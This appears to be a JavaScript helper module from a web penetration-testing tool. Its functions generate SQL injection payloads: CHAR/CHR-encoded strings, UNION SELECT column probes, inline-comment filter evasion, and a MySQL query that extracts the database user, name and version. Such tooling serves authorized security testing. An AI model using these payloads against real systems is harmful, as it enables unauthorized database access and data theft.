SQL = {

    selectionToSQLChar: function (dbEngine, txt) {
        var charStringArray = [];
        var decimal;
        for (var c = 0; c < txt.length; c++) {
            decimal = txt.charCodeAt(c);
            charStringArray.push(decimal);
        }

        var charString = '';

        switch (dbEngine) {
            case "mysql":
                charString = 'CHAR(' + charStringArray.join(', ') + ')';
                break;
            case "mssql":
                charString = ' CHAR(' + charStringArray.join(') + CHAR(') + ')';
                break;
            case "oracle":
                charString = ' CHR(' + charStringArray.join(') || CHR(') + ')';
                break;
        }
        return charString;
    },

    selectionToUnionSelect: function (columns) {
        columns = Math.min(1000, parseInt(columns));
        var colArray = [];
        for (var i = 0; i < columns; i++) {
            colArray.push(i + 1);
        }
        return "UNION SELECT " + colArray.join(',');
    },

    selectionToUnionAllSelect: function (columns) {
        columns = Math.min(1000, parseInt(columns));
        var colArray = [];
        for (var i = 0; i < columns; i++) {
            colArray.push(i + 1);
        }
        return "UNION ALL SELECT " + colArray.join(',');
    },

    selectionToUnionAllSelectNULL: function (columns) {
        columns = Math.min(1000, parseInt(columns));
        var colArray = [];
        for (var i = 0; i < columns; i++) {
            colArray.push('NULL');
        }
        return "UNION ALL SELECT " + colArray.join(',');
    },

    selectionToInlineComments: function (txt) {
        txt = txt.replace(/ /g, "/**/");
        return txt;
    },
    /* GENERAL FUNCTIONS */

    /* MYSQL FUNCTIONS */
    selectionMySQLConvertUsing: function (encoding, txt) {
        return "CONVERT(" + txt + " USING " + encoding + ")";
    },

    selectionMySQLBasicInfo: function () {
        return "CONCAT_WS(CHAR(32,58,32),user(),database(),version())";
    }
    /* MYSQL FUNCTIONS */
};